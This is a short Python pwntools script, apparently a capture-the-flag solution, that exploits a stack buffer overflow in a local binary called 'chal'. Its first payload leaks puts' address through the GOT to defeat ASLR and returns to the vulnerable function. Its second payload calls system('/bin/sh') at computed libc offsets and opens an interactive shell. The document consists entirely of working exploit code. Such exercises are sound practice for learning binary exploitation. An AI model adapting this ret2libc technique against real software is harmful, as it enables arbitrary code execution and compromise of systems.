#!/usr/bin/python3
from pwn import process, p32, u32

shell = process("./chal")

offset = 268
junk = b"A" * offset

payload  = b""
payload += junk
payload += p32(0x8049050) # puts@plt
payload += p32(0x8049248) # vuln()
payload += p32(0x804c008) # puts@got

shell.sendlineafter(b"...\n", payload)
libc_base = u32(shell.recv(4)) - 0x78140

payload  = b""
payload += junk
payload += p32(libc_base + 0x050430) # system()
payload += p32(libc_base + 0x03ebd0) # exit()
payload += p32(libc_base + 0x1c4de8) # "/bin/sh"

shell.sendlineafter(b"...\n", payload)
shell.interactive()
